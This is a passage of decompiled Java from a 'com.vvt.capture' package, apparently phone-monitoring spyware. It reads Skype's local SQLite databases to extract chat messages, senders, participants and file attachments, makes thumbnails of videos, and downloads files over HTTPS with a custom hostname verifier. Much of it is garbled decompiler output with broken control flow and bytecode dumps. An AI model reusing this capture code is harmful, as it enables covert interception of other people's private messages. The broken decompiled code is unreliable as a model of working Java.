    //   221: aload 8
    //   223: invokevirtual 164	com/vvt/capture/e/a/d:a	(Ljava/lang/String;)V
    //   226: aload 4
    //   228: aload 10
    //   230: invokevirtual 1105	com/vvt/capture/e/a/d:MyUncaughtExceptionHandler	(Ljava/lang/String;)V
    //   233: aload 4
    //   235: aload 11
    //   237: invokevirtual 1108	com/vvt/capture/e/a/d:d	(Ljava/lang/String;)V
    //   240: aload 4
    //   242: astore_3
    //   243: aload 5
    //   245: ifnull +10 -> 255
    //   248: aload 5
    //   250: invokeinterface 66 1 0
    //   255: aload_3
    //   256: areturn
    //   257: astore 4
    //   259: iconst_0
    //   260: istore 9
    //   262: aconst_null
    //   263: astore 4
    //   265: getstatic 24	com/vvt/capture/e/d:MyUncaughtExceptionHandler	Z
    //   268: istore 6
    //   270: iload 6
    //   272: ifeq +3 -> 275
    //   275: aload 4
    //   277: ifnull -22 -> 255
    //   280: aload 4
    //   282: invokeinterface 66 1 0
    //   287: goto -32 -> 255
    //   290: astore 4
    //   292: iconst_0
    //   293: istore 6
    //   295: aconst_null
    //   296: astore 5
    //   298: aload 4
    //   300: astore_3
    //   301: aload 5
    //   303: ifnull +10 -> 313
    //   306: aload 5
    //   308: invokeinterface 66 1 0
    //   313: aload_3
    //   314: athrow
    //   315: astore_3
    //   316: goto -15 -> 301
    //   319: astore_3
    //   320: aload 4
    //   322: astore 5
    //   324: goto -23 -> 301
    //   327: astore 4
    //   329: aload 5
    //   331: astore 4
    //   333: goto -68 -> 265
    //   336: astore_3
    //   337: aload 4
    //   339: astore_3
    //   340: aload 5
    //   342: astore 4
    //   344: goto -79 -> 265
    //   347: aload 4
    //   349: astore 8
    //   351: goto -142 -> 209
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	354	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	354	1	paramString1	String
    //   0	354	2	paramString2	String
    //   1	313	3	localObject1	Object
    //   315	1	3	localObject2	Object
    //   319	1	3	localObject3	Object
    //   336	1	3	localException1	Exception
    //   339	1	3	localObject4	Object
    //   5	236	4	localObject5	Object
    //   257	1	4	localException2	Exception
    //   263	18	4	localObject6	Object
    //   290	31	4	localObject7	Object
    //   327	1	4	localException3	Exception
    //   331	17	4	localObject8	Object
    //   15	326	5	localObject9	Object
    //   56	238	6	bool1	boolean
    //   66	112	7	i	int
    //   191	3	7	bool2	boolean
    //   69	281	8	localObject10	Object
    //   98	3	9	bool3	boolean
    //   119	142	9	j	int
    //   157	72	10	str1	String
    //   184	52	11	str2	String
    // Exception table:
    //   from	to	target	type
    //   2	5	257	java/lang/Exception
    //   7	12	257	java/lang/Exception
    //   19	24	257	java/lang/Exception
    //   28	32	257	java/lang/Exception
    //   41	46	257	java/lang/Exception
    //   48	53	257	java/lang/Exception
    //   58	63	257	java/lang/Exception
    //   74	76	257	java/lang/Exception
    //   79	84	257	java/lang/Exception
    //   2	5	290	finally
    //   7	12	290	finally
    //   19	24	290	finally
    //   28	32	290	finally
    //   41	46	290	finally
    //   48	53	290	finally
    //   58	63	290	finally
    //   74	76	290	finally
    //   79	84	290	finally
    //   91	98	315	finally
    //   112	119	315	finally
    //   123	130	315	finally
    //   139	146	315	finally
    //   150	157	315	finally
    //   166	173	315	finally
    //   177	184	315	finally
    //   186	191	315	finally
    //   198	203	315	finally
    //   209	212	315	finally
    //   214	219	315	finally
    //   221	226	315	finally
    //   228	233	315	finally
    //   235	240	315	finally
    //   265	268	319	finally
    //   91	98	327	java/lang/Exception
    //   112	119	327	java/lang/Exception
    //   123	130	327	java/lang/Exception
    //   139	146	327	java/lang/Exception
    //   150	157	327	java/lang/Exception
    //   166	173	327	java/lang/Exception
    //   177	184	327	java/lang/Exception
    //   186	191	327	java/lang/Exception
    //   198	203	327	java/lang/Exception
    //   209	212	327	java/lang/Exception
    //   214	219	327	java/lang/Exception
    //   221	226	336	java/lang/Exception
    //   228	233	336	java/lang/Exception
    //   235	240	336	java/lang/Exception
  }
  
  private static b b(SQLiteDatabase paramSQLiteDatabase1, SQLiteDatabase paramSQLiteDatabase2, String paramString1, com.vvt.capture.e.a.c paramc, int paramInt, String paramString2, ICallLogData.Direction paramDirection, com.vvt.base.b paramb, boolean paramBoolean, String paramString3)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = ICallLogData.Direction.IN;
    if (paramDirection == localObject1) {}
    Object localObject2;
    b localb;
    int i1;
    boolean bool8;
    Object localObject3;
    long l1;
    for (localObject1 = "[You received a file.]";; localObject1 = "[You sent a file.]")
    {
      localObject2 = "<URIObject type=\"File";
      localb = new com/vvt/capture/e/b;
      int n = 1;
      localb.<init>(n, (String)localObject1);
      if (paramString2 != null)
      {
        int i = paramString2.length();
        n = 1;
        if (i >= n) {}
      }
      else
      {
        bool2 = a;
        if (bool2) {}
        localObject1 = "body_xml";
        i1 = 1;
        paramString2 = a(paramSQLiteDatabase1, paramInt, (String)localObject1, i1);
      }
      bool2 = com.vvt.ag.b.a(paramString2);
      if (bool2) {
        break label1386;
      }
      localObject1 = "<URIObject type=\"File";
      bool2 = paramString2.startsWith((String)localObject1);
      if (bool2) {
        break label250;
      }
      if (paramBoolean) {
        break label296;
      }
      bool2 = a;
      if (bool2) {}
      bool2 = false;
      i1 = 0;
      localObject2 = null;
      localObject1 = paramString2;
      for (;;)
      {
        int i3 = 10;
        if (i1 >= i3) {
          break;
        }
        localObject1 = a(paramSQLiteDatabase1, paramInt, "body_xml");
        bool8 = com.vvt.ag.b.a((String)localObject1);
        if (!bool8)
        {
          localObject3 = "<URIObject type=\"File";
          bool8 = ((String)localObject1).startsWith((String)localObject3);
          if (bool8) {
            break;
          }
        }
        l1 = 6000L;
        SystemClock.sleep(l1);
        bool8 = a;
        if (bool8) {}
        i1 += 1;
      }
    }
    paramString2 = (String)localObject1;
    label250:
    localObject1 = "<URIObject type=\"File";
    boolean bool2 = paramString2.startsWith((String)localObject1);
    if (!bool2)
    {
      bool2 = a;
      if (!bool2) {}
    }
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      for (localObject1 = localb;; localObject1 = localb)
      {
        return (b)localObject1;
        label296:
        bool2 = a;
        if (!bool2) {
          break;
        }
        break;
        localObject1 = a(paramSQLiteDatabase2, paramBoolean);
        localObject2 = g.b(paramString2);
        bool8 = a;
        if ((bool8) && (paramSQLiteDatabase2 == null)) {
          break label1373;
        }
        long l2 = 0L;
        localObject3 = "";
        Object localObject4 = ICallLogData.Direction.IN;
        String str1;
        label527:
        boolean bool9;
        long l4;
        boolean bool10;
        boolean bool7;
        if (paramDirection == localObject4)
        {
          bool2 = a;
          if (bool2) {}
          localObject1 = new java/lang/StringBuilder;
          ((StringBuilder)localObject1).<init>();
          str1 = "u" + (String)localObject2;
          localObject2 = a(paramSQLiteDatabase2, str1, paramBoolean);
          bool2 = false;
          int i4 = 0;
          localObject4 = null;
          localObject1 = localObject2;
          i1 = 10;
          long l3;
          boolean bool3;
          if ((i4 < i1) && (!paramBoolean))
          {
            boolean bool6 = a;
            if (bool6) {}
            int i2 = ((ArrayList)localObject1).size();
            if (i2 == 0)
            {
              bool2 = a;
              if (bool2) {}
              l3 = 6000L;
              SystemClock.sleep(l3);
              bool2 = a;
              if (bool2) {}
              localObject2 = a(paramSQLiteDatabase2, str1, paramBoolean);
              int j = ((ArrayList)localObject2).size();
              if (j == 0) {
                break label824;
              }
              localObject1 = localObject2;
            }
          }
          else
          {
            localObject4 = ((ArrayList)localObject1).iterator();
            localObject2 = localObject3;
            l1 = l2;
            bool3 = ((Iterator)localObject4).hasNext();
            if (!bool3) {
              break label1159;
            }
            localObject1 = (a)((Iterator)localObject4).next();
            localObject5 = ((a)localObject1).a;
            str1 = "poriginal";
            bool9 = ((String)localObject5).equalsIgnoreCase(str1);
            if (!bool9) {
              break label933;
            }
            l4 = ((a)localObject1).b;
            localObject1 = g.a((a)localObject1);
            bool10 = a;
            if (!bool10) {}
          }
          for (;;)
          {
            l1 = l4;
            localObject2 = localObject1;
            break label527;
            bool7 = a;
            if (bool7) {}
            Iterator localIterator = ((ArrayList)localObject1).iterator();
            localObject2 = localObject1;
            label635:
            bool3 = localIterator.hasNext();
            int i5;
            String str2;
            String str3;
            long l5;
            long l6;
            if (bool3)
            {
              localObject1 = (a)localIterator.next();
              i5 = a;
              if (i5 != 0) {}
              str2 = ((a)localObject1).a;
              str3 = "poriginal";
              i5 = str2.equalsIgnoreCase(str3);
              if (i5 != 0)
              {
                l5 = ((a)localObject1).b;
                l6 = 0L;
                i5 = l5 < l6;
                if (i5 == 0)
                {
                  bool3 = a;
                  if (bool3) {}
                  l3 = 6000L;
                  SystemClock.sleep(l3);
                  bool3 = a;
                  if (bool3) {}
                  localObject1 = a(paramSQLiteDatabase2, str1, paramBoolean);
                }
              }
            }
            for (;;)
            {
              localObject2 = localObject1;
              break label635;
              str2 = ((a)localObject1).a;
              str3 = "poriginal";
              i5 = str2.equalsIgnoreCase(str3);
              if (i5 != 0)
              {
                l5 = ((a)localObject1).b;
                l6 = 0L;
                i5 = l5 < l6;
                if (i5 != 0)
                {
                  bool3 = a;
                  if (bool3) {}
                  label824:
                  int k = i4 + 1;
                  i4 = k;
                  localObject1 = localObject2;
                  break;
                }
              }
              localObject1 = ((a)localObject1).a;
              str2 = "pthumbnail";
              boolean bool4 = ((String)localObject1).equalsIgnoreCase(str2);
              if (bool4)
              {
                int m = ((ArrayList)localObject2).size();
                i5 = 1;
                if (m == i5)
                {
                  bool5 = a;
                  if (bool5) {}
                  l3 = 6000L;
                  SystemClock.sleep(l3);
                  localObject1 = a(paramSQLiteDatabase2, str1, paramBoolean);
                  continue;
                }
              }
              bool5 = a;
              if (bool5) {}
              localObject1 = localObject2;
            }
            label933:
            localObject5 = ((a)localObject1).a;
            str1 = "pthumbnail";
            bool9 = ((String)localObject5).equalsIgnoreCase(str1);
            if (bool9)
            {
              bool5 = a;
              if (!bool5) {}
            }
            localObject1 = localObject2;
            l4 = l1;
          }
        }
        else
        {
          bool7 = a;
          if (bool7) {}
          localObject1 = a(paramSQLiteDatabase2, (String)localObject1, paramBoolean);
          localObject4 = ((ArrayList)localObject1).iterator();
          localObject2 = localObject3;
          l1 = l2;
          bool5 = ((Iterator)localObject4).hasNext();
          if (bool5)
          {
            localObject1 = (a)((Iterator)localObject4).next();
            localObject5 = ((a)localObject1).a;
            str1 = "coriginal";
            bool9 = ((String)localObject5).equalsIgnoreCase(str1);
            if (bool9)
            {
              l4 = ((a)localObject1).b;
              localObject1 = g.a((a)localObject1);
              bool10 = a;
              if (!bool10) {}
            }
            for (;;)
            {
              l1 = l4;
              localObject2 = localObject1;
              break;
              localObject5 = ((a)localObject1).a;
              str1 = "pthumbnail";
              bool9 = ((String)localObject5).equalsIgnoreCase(str1);
              if (bool9)
              {
                bool5 = a;
                if (!bool5) {}
              }
              localObject1 = localObject2;
              l4 = l1;
            }
          }
        }
        label1159:
        bool5 = a;
        if (bool5) {}
        bool5 = com.vvt.ag.b.a((String)localObject2);
        if (bool5) {
          break label1360;
        }
        bool5 = a(254, paramb, l1);
        bool8 = a;
        if ((bool8) && (bool5)) {
          break label1224;
        }
        bool5 = false;
        localb.b = false;
      }
      label1224:
      localObject1 = ImType.SKYPE;
      localObject3 = ImMediaFileType.ATTACHMENT;
      Object localObject6 = paramb.f();
      localObject1 = g.a(paramString1, (String)localObject2, (ImType)localObject1, (ImMediaFileType)localObject3, (String)localObject6);
      localObject3 = new java/io/File;
      ((File)localObject3).<init>((String)localObject2);
      localObject3 = ((File)localObject3).getName();
      localObject2 = a((String)localObject3, (String)localObject2);
      localObject6 = new java/util/ArrayList;
      ((ArrayList)localObject6).<init>();
      Object localObject5 = new com/vvt/im/events/info/a;
      ((com.vvt.im.events.info.a)localObject5).<init>();
      ((com.vvt.im.events.info.a)localObject5).a((String)localObject3);
      ((com.vvt.im.events.info.a)localObject5).c((String)localObject1);
      ((com.vvt.im.events.info.a)localObject5).b((String)localObject2);
      ((ArrayList)localObject6).add(localObject5);
      paramc.a((List)localObject6);
      localObject1 = null;
      localb.a = null;
      boolean bool5 = a;
      if (bool5)
      {
        continue;
        label1360:
        bool5 = a;
        if (bool5)
        {
          continue;
          label1373:
          bool5 = a;
          if (bool5)
          {
            continue;
            label1386:
            bool5 = a;
            if (!bool5) {}
          }
        }
      }
    }
  }
  
  public static String b()
  {
    synchronized (d.class)
    {
      String str = com.vvt.n.a.e.b.a;
      str = c(str);
      boolean bool = com.vvt.ag.b.a(str);
      if (bool)
      {
        str = com.vvt.n.a.e.b.b;
        str = c(str);
      }
      return str;
    }
  }
  
  /* Error */
  private static String b(String paramString1, String paramString2)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: getstatic 17	com/vvt/capture/e/d:a	Z
    //   5: istore_3
    //   6: iload_3
    //   7: ifeq +3 -> 10
    //   10: getstatic 109	com/vvt/im/events/ImType:SKYPE	Lcom/vvt/im/events/ImType;
    //   13: astore 4
    //   15: getstatic 304	com/vvt/im/events/ImMediaFileType:THUMBMAIL	Lcom/vvt/im/events/ImMediaFileType;
    //   18: astore 5
    //   20: aload_0
    //   21: aload 4
    //   23: aload 5
    //   25: invokestatic 120	com/vvt/im/a/MyUncaughtExceptionHandler:a	(Ljava/lang/String;Lcom/vvt/im/events/ImType;Lcom/vvt/im/events/ImMediaFileType;)Ljava/lang/String;
    //   28: astore 4
    //   30: getstatic 304	com/vvt/im/events/ImMediaFileType:THUMBMAIL	Lcom/vvt/im/events/ImMediaFileType;
    //   33: invokestatic 123	com/vvt/im/a/MyUncaughtExceptionHandler:a	(Lcom/vvt/im/events/ImMediaFileType;)Ljava/lang/String;
    //   36: astore 5
    //   38: new 125	java/lang/StringBuilder
    //   41: astore 6
    //   43: aload 6
    //   45: invokespecial 126	java/lang/StringBuilder:<init>	()V
    //   48: aload 6
    //   50: aload 4
    //   52: invokevirtual 130	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   55: astore 4
    //   57: getstatic 136	java/io/File:separator	Ljava/lang/String;
    //   60: astore 6
    //   62: aload 4
    //   64: aload 6
    //   66: invokevirtual 130	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   69: aload 5
    //   71: invokevirtual 130	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   74: invokevirtual 139	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   77: astore 6
    //   79: iconst_3
    //   80: istore_3
    //   81: aload_1
    //   82: iload_3
    //   83: invokestatic 1134	android/media/ThumbnailUtils:createVideoThumbnail	(Ljava/lang/String;I)Landroid/graphics/Bitmap;
    //   86: astore 4
    //   88: new 132	java/io/File
    //   91: astore 7
    //   93: aload 7
    //   95: aload 6
    //   97: invokespecial 158	java/io/File:<init>	(Ljava/lang/String;)V
    //   100: aload 4
    //   102: ifnull +83 -> 185
    //   105: getstatic 1140	android/graphics/Bitmap$Config:ARGB_8888	Landroid/graphics/Bitmap$Config;
    //   108: astore 5
    //   110: iconst_0
    //   111: istore 8
    //   113: aload 4
    //   115: aload 5
    //   117: iconst_0
    //   118: invokevirtual 1146	android/graphics/Bitmap:copy	(Landroid/graphics/Bitmap$Config;Z)Landroid/graphics/Bitmap;
    //   121: astore 4
    //   123: new 1148	java/io/FileOutputStream
    //   126: astore 5
    //   128: aload 5
    //   130: aload 7
    //   132: invokespecial 1151	java/io/FileOutputStream:<init>	(Ljava/io/File;)V
    //   135: getstatic 1157	android/graphics/Bitmap$CompressFormat:JPEG	Landroid/graphics/Bitmap$CompressFormat;
    //   138: astore 7
    //   140: bipush 40
    //   142: istore 8
    //   144: aload 4
    //   146: aload 7
    //   148: iload 8
    //   150: aload 5
    //   152: invokevirtual 1162	android/graphics/Bitmap:compress	(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z
    //   155: istore 9
    //   157: iload 9
    //   159: ifeq +6 -> 165
    //   162: aload 6
    //   164: astore_2
    //   165: aload 5
    //   167: invokevirtual 1165	java/io/FileOutputStream:flush	()V
    //   170: aload 5
    //   172: ifnull +8 -> 180
    //   175: aload 5
    //   177: invokestatic 1168	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   180: aload 4
    //   182: invokevirtual 1171	android/graphics/Bitmap:recycle	()V
    //   185: getstatic 17	com/vvt/capture/e/d:a	Z
    //   188: istore_3
    //   189: iload_3
    //   190: ifeq +3 -> 193
    //   193: aload_2
    //   194: areturn
    //   195: astore 5
    //   197: aconst_null
    //   198: astore 5
    //   200: getstatic 24	com/vvt/capture/e/d:MyUncaughtExceptionHandler	Z
    //   203: istore 10
    //   205: iload 10
    //   207: ifeq +3 -> 210
    //   210: aload 5
    //   212: ifnull -32 -> 180
    //   215: goto -40 -> 175
    //   218: astore 4
    //   220: aconst_null
    //   221: astore 5
    //   223: aload 5
    //   225: ifnull +8 -> 233
    //   228: aload 5
    //   230: invokestatic 1168	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   233: aload 4
    //   235: athrow
    //   236: astore 4
    //   238: goto -15 -> 223
    //   241: astore 6
    //   243: goto -43 -> 200
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	246	0	paramString1	String
    //   0	246	1	paramString2	String
    //   1	193	2	localObject1	Object
    //   5	2	3	bool1	boolean
    //   80	3	3	i	int
    //   188	2	3	bool2	boolean
    //   13	168	4	localObject2	Object
    //   218	16	4	localObject3	Object
    //   236	1	4	localObject4	Object
    //   18	158	5	localObject5	Object
    //   195	1	5	localException1	Exception
    //   198	31	5	localOutputStream	java.io.OutputStream
    //   41	122	6	localObject6	Object
    //   241	1	6	localException2	Exception
    //   91	56	7	localObject7	Object
    //   111	38	8	j	int
    //   155	3	9	bool3	boolean
    //   203	3	10	bool4	boolean
    // Exception table:
    //   from	to	target	type
    //   105	108	195	java/lang/Exception
    //   117	121	195	java/lang/Exception
    //   123	126	195	java/lang/Exception
    //   130	135	195	java/lang/Exception
    //   105	108	218	finally
    //   117	121	218	finally
    //   123	126	218	finally
    //   130	135	218	finally
    //   135	138	236	finally
    //   150	155	236	finally
    //   165	170	236	finally
    //   200	203	236	finally
    //   135	138	241	java/lang/Exception
    //   150	155	241	java/lang/Exception
    //   165	170	241	java/lang/Exception
  }
  
  private static String c()
  {
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    localStringBuilder.append("SELECT DISTINCT ");
    localStringBuilder.append("m.id, convo_id, chatmsg_status, chatmsg_type, ");
    localStringBuilder.append("m.type, body_xml, m.timestamp, author, from_dispname, participant_count, ");
    localStringBuilder.append("participants, displayname ");
    localStringBuilder.append("FROM Messages m ");
    localStringBuilder.append("LEFT JOIN ");
    localStringBuilder.append("Conversations conv ");
    localStringBuilder.append("ON m.convo_id = conv.id ");
    localStringBuilder.append("LEFT JOIN ");
    localStringBuilder.append("(SELECT * FROM Chats GROUP BY (conv_dbid)) as MyUncaughtExceptionHandler ");
    localStringBuilder.append("ON m.convo_id = MyUncaughtExceptionHandler.conv_dbid ");
    localStringBuilder.append("WHERE m.id > ? ");
    localStringBuilder.append("AND m.id <= ? ");
    localStringBuilder.append("AND (m.type IN (61, 63, 68, 70, 201, 202, 253, 254, 255))");
    localStringBuilder.append("ORDER BY m.id DESC ");
    return localStringBuilder.toString();
  }
  
  public static String c(String paramString)
  {
    synchronized (d.class)
    {
      String str = com.vvt.n.a.e.b.a(paramString);
      return str;
    }
  }
  
  /* Error */
  private static boolean c(String paramString1, String paramString2)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: getstatic 17	com/vvt/capture/e/d:a	Z
    //   5: istore_3
    //   6: iload_3
    //   7: ifeq +3 -> 10
    //   10: getstatic 17	com/vvt/capture/e/d:a	Z
    //   13: istore_3
    //   14: iload_3
    //   15: ifeq +3 -> 18
    //   18: new 1202	java/net/URL
    //   21: astore 4
    //   23: aload 4
    //   25: aload_0
    //   26: invokespecial 1203	java/net/URL:<init>	(Ljava/lang/String;)V
    //   29: ldc_w 1205
    //   32: astore 5
    //   34: aload_0
    //   35: aload 5
    //   37: invokevirtual 193	java/lang/String:startsWith	(Ljava/lang/String;)Z
    //   40: istore 6
    //   42: iload 6
    //   44: ifeq +186 -> 230
    //   47: aload 4
    //   49: invokevirtual 1209	java/net/URL:openConnection	()Ljava/net/URLConnection;
    //   52: astore 4
    //   54: aload 4
    //   56: checkcast 1211	java/net/HttpURLConnection
    //   59: astore 4
    //   61: aload 4
    //   63: astore 5
    //   65: aload 5
    //   67: ifnull +372 -> 439
    //   70: getstatic 17	com/vvt/capture/e/d:a	Z
    //   73: istore_3
    //   74: iload_3
    //   75: ifeq +3 -> 78
    //   78: sipush 4096
    //   81: istore_3
    //   82: iload_3
    //   83: newarray <illegal type>
    //   85: astore 7
    //   87: new 1148	java/io/FileOutputStream
    //   90: astore 4
    //   92: aload 4
    //   94: aload_1
    //   95: invokespecial 1213	java/io/FileOutputStream:<init>	(Ljava/lang/String;)V
    //   98: aload 5
    //   100: invokevirtual 1219	java/net/URLConnection:getInputStream	()Ljava/io/InputStream;
    //   103: astore_2
    //   104: aload_2
    //   105: aload 7
    //   107: invokevirtual 1225	java/io/InputStream:read	([B)I
    //   110: istore 8
    //   112: iconst_m1
    //   113: istore 9
    //   115: iload 8
    //   117: iload 9
    //   119: if_icmpeq +325 -> 444
    //   122: iconst_0
    //   123: istore 9
    //   125: aload 4
    //   127: aload 7
    //   129: iconst_0
    //   130: iload 8
    //   132: invokevirtual 1229	java/io/FileOutputStream:write	([BII)V
    //   135: goto -31 -> 104
    //   138: astore 7
    //   140: getstatic 24	com/vvt/capture/e/d:MyUncaughtExceptionHandler	Z
    //   143: istore 10
    //   145: iload 10
    //   147: ifeq +3 -> 150
    //   150: aload 4
    //   152: invokestatic 1168	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   155: aload_2
    //   156: invokestatic 1232	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   159: aload 5
    //   161: ifnull +51 -> 212
    //   164: aload 5
    //   166: instanceof 1211
    //   169: istore_3
    //   170: iload_3
    //   171: ifeq +19 -> 190
    //   174: aload 5
    //   176: astore 4
    //   178: aload 5
    //   180: checkcast 1211	java/net/HttpURLConnection
    //   183: astore 4
    //   185: aload 4
    //   187: invokevirtual 1235	java/net/HttpURLConnection:disconnect	()V
    //   190: aload 5
    //   192: instanceof 1237
    //   195: istore_3
    //   196: iload_3
    //   197: ifeq +15 -> 212
    //   200: aload 5
    //   202: checkcast 1237	javax/net/ssl/HttpsURLConnection
    //   205: astore 5
    //   207: aload 5
    //   209: invokevirtual 1238	javax/net/ssl/HttpsURLConnection:disconnect	()V
    //   212: getstatic 20	com/vvt/capture/e/d:removeFromPath	Z
    //   215: istore_3
    //   216: iload_3
    //   217: ifeq +3 -> 220
    //   220: getstatic 17	com/vvt/capture/e/d:a	Z
    //   223: istore_3
    //   224: iload_3
    //   225: ifeq +3 -> 228
    //   228: iconst_0
    //   229: ireturn
    //   230: invokestatic 1240	com/vvt/capture/e/d:AppEngine1	()V
    //   233: aload 4
    //   235: invokevirtual 1209	java/net/URL:openConnection	()Ljava/net/URLConnection;
    //   238: astore 4
    //   240: aload 4
    //   242: checkcast 1237	javax/net/ssl/HttpsURLConnection
    //   245: astore 4
    //   247: getstatic 35	com/vvt/capture/e/d:e	Ljavax/net/ssl/HostnameVerifier;
    //   250: astore 5
    //   252: aload 4
    //   254: aload 5
    //   256: invokevirtual 1244	javax/net/ssl/HttpsURLConnection:setHostnameVerifier	(Ljavax/net/ssl/HostnameVerifier;)V
    //   259: aload 4
    //   261: astore 5
    //   263: goto -198 -> 65
    //   266: astore 4
    //   268: iconst_0
    //   269: istore 6
    //   271: aconst_null
    //   272: astore 5
    //   274: iconst_0
    //   275: istore_3
    //   276: aconst_null
    //   277: astore 4
    //   279: getstatic 24	com/vvt/capture/e/d:MyUncaughtExceptionHandler	Z
    //   282: istore 10
    //   284: iload 10
    //   286: ifeq +3 -> 289
    //   289: aload 4
    //   291: invokestatic 1168	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   294: aload_2
    //   295: invokestatic 1232	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   298: aload 5
    //   300: ifnull -88 -> 212
    //   303: aload 5
    //   305: instanceof 1211
    //   308: istore_3
    //   309: iload_3
    //   310: ifeq +19 -> 329
    //   313: aload 5
    //   315: astore 4
    //   317: aload 5
    //   319: checkcast 1211	java/net/HttpURLConnection
    //   322: astore 4
    //   324: aload 4
    //   326: invokevirtual 1235	java/net/HttpURLConnection:disconnect	()V
    //   329: aload 5
    //   331: instanceof 1237
    //   334: istore_3
    //   335: iload_3
    //   336: ifeq -124 -> 212
    //   339: aload 5
    //   341: checkcast 1237	javax/net/ssl/HttpsURLConnection
    //   344: astore 5
    //   346: goto -139 -> 207
    //   349: astore 4
    //   351: iconst_0
    //   352: istore 6
    //   354: aconst_null
    //   355: astore 5
    //   357: iconst_0
    //   358: istore 10
    //   360: aconst_null
    //   361: astore 7
    //   363: aconst_null
    //   364: astore 11
    //   366: aload 4
    //   368: astore_2
    //   369: iconst_0
    //   370: istore_3
    //   371: aconst_null
    //   372: astore 4
    //   374: aload 7
    //   376: invokestatic 1168	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   379: aload 4
    //   381: invokestatic 1232	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   384: aload 5
    //   386: ifnull +51 -> 437
    //   389: aload 5
    //   391: instanceof 1211
    //   394: istore_3
    //   395: iload_3
    //   396: ifeq +19 -> 415
    //   399: aload 5
    //   401: astore 4
    //   403: aload 5
    //   405: checkcast 1211	java/net/HttpURLConnection
    //   408: astore 4
    //   410: aload 4
    //   412: invokevirtual 1235	java/net/HttpURLConnection:disconnect	()V
    //   415: aload 5
    //   417: instanceof 1237
    //   420: istore_3
    //   421: iload_3
    //   422: ifeq +15 -> 437
    //   425: aload 5
    //   427: checkcast 1237	javax/net/ssl/HttpsURLConnection
    //   430: astore 5
    //   432: aload 5
    //   434: invokevirtual 1238	javax/net/ssl/HttpsURLConnection:disconnect	()V
    //   437: aload_2
    //   438: athrow
    //   439: iconst_0
    //   440: istore_3
    //   441: aconst_null
    //   442: astore 4
    //   444: aload 4
    //   446: invokestatic 1168	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   449: aload_2
    //   450: invokestatic 1232	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   453: aload 5
    //   455: ifnull -243 -> 212
    //   458: aload 5
    //   460: instanceof 1211
    //   463: istore_3
    //   464: iload_3
    //   465: ifeq +19 -> 484
    //   468: aload 5
    //   470: astore 4
    //   472: aload 5
    //   474: checkcast 1211	java/net/HttpURLConnection
    //   477: astore 4
    //   479: aload 4
    //   481: invokevirtual 1235	java/net/HttpURLConnection:disconnect	()V
    //   484: aload 5
    //   486: instanceof 1237
    //   489: istore_3
    //   490: iload_3
    //   491: ifeq -279 -> 212
    //   494: aload 5
    //   496: checkcast 1237	javax/net/ssl/HttpsURLConnection
    //   499: astore 5
    //   501: goto -294 -> 207
    //   504: astore 4
    //   506: iconst_0
    //   507: istore 10
    //   509: aconst_null
    //   510: astore 7
    //   512: aconst_null
    //   513: astore 11
    //   515: aload 4
    //   517: astore_2
    //   518: iconst_0
    //   519: istore_3
    //   520: aconst_null
    //   521: astore 4
    //   523: goto -149 -> 374
    //   526: astore 11
    //   528: aload 4
    //   530: astore 7
    //   532: iconst_0
    //   533: istore_3
    //   534: aconst_null
    //   535: astore 4
    //   537: aload 11
    //   539: astore_2
    //   540: goto -166 -> 374
    //   543: astore 11
    //   545: aload 4
    //   547: astore 7
    //   549: aload_2
    //   550: astore 4
    //   552: aload 11
    //   554: astore_2
    //   555: goto -181 -> 374
    //   558: astore 4
    //   560: iconst_0
    //   561: istore_3
    //   562: aconst_null
    //   563: astore 4
    //   565: goto -286 -> 279
    //   568: astore 7
    //   570: goto -291 -> 279
    //   573: astore 4
    //   575: iconst_0
    //   576: istore 6
    //   578: aconst_null
    //   579: astore 5
    //   581: iconst_0
    //   582: istore_3
    //   583: aconst_null
    //   584: astore 4
    //   586: goto -446 -> 140
    //   589: astore 4
    //   591: iconst_0
    //   592: istore_3
    //   593: aconst_null
    //   594: astore 4
    //   596: goto -456 -> 140
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	599	0	paramString1	String
    //   0	599	1	paramString2	String
    //   1	554	2	localObject1	Object
    //   5	70	3	bool1	boolean
    //   81	2	3	i	int
    //   169	424	3	bool2	boolean
    //   21	239	4	localObject2	Object
    //   266	1	4	localException1	Exception
    //   277	48	4	localObject3	Object
    //   349	18	4	localObject4	Object
    //   372	108	4	localObject5	Object
    //   504	12	4	localObject6	Object
    //   521	30	4	localObject7	Object
    //   558	1	4	localException2	Exception
    //   563	1	4	localObject8	Object
    //   573	1	4	localFileNotFoundException1	java.io.FileNotFoundException
    //   584	1	4	localObject9	Object
    //   589	1	4	localFileNotFoundException2	java.io.FileNotFoundException
    //   594	1	4	localObject10	Object
    //   32	548	5	localObject11	Object
    //   40	537	6	bool3	boolean
    //   85	43	7	arrayOfByte	byte[]
    //   138	1	7	localFileNotFoundException3	java.io.FileNotFoundException
    //   361	187	7	localObject12	Object
    //   568	1	7	localException3	Exception
    //   110	21	8	j	int
    //   113	11	9	k	int
    //   143	365	10	bool4	boolean
    //   364	150	11	localObject13	Object
    //   526	12	11	localObject14	Object
    //   543	10	11	localObject15	Object
    // Exception table:
    //   from	to	target	type
    //   98	103	138	java/io/FileNotFoundException
    //   105	110	138	java/io/FileNotFoundException
    //   130	135	138	java/io/FileNotFoundException
    //   10	13	266	java/lang/Exception
